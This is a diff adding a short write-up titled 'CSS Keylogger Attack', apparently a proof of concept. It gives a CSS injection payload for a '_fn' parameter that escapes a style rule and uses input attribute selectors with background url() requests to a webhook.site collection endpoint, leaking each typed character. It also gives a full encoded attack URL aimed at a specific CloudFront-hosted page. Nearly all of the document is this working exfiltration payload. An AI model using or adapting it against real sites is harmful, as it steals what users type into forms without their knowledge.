@@ -1,0 +1,13 @@
+CSS Keylogger Attack
+=====================
+
+This payload extracts typed characters by triggering requests for each input value:
+
+Payload (URL encoded for _fn parameter):
+x';} input[value$="a"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=a')} input[value$="b"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=b')} input[value$="c"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=c')} input[value$="1"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=1')} input[value$="2"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=2')} input[value$="3"]{background:url('https://webhook.site/b5c348fc-bed5-4718-a19c-b9d55e537749?key=3')} /*
+
+Full URL:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D%20input%5Bvalue%24%3D%22a%22%5D%7Bbackground%3Aurl%28%27https%3A%2F%2Fwebhook.site%2Fb5c348fc-bed5-4718-a19c-b9d55e537749%3Fkey%3Da%27%29%7D%20input%5Bvalue%24%3D%22b%22%5D%7Bbackground%3Aurl%28%27https%3A%2F%2Fwebhook.site%2Fb5c348fc-bed5-4718-a19c-b9d55e537749%3Fkey%3Db%27%29%7D%20input%5Bvalue%24%3D%221%22%5D%7Bbackground%3Aurl%28%27https%3A%2F%2Fwebhook.site%2Fb5c348fc-bed5-4718-a19c-b9d55e537749%3Fkey%3D1%27%29%7D%20%2F*&_fo=y&_to=TEST_TOKEN
+
+If any input field exists in the widget and user types in it, 
+each typed character triggers a request to attacker server!
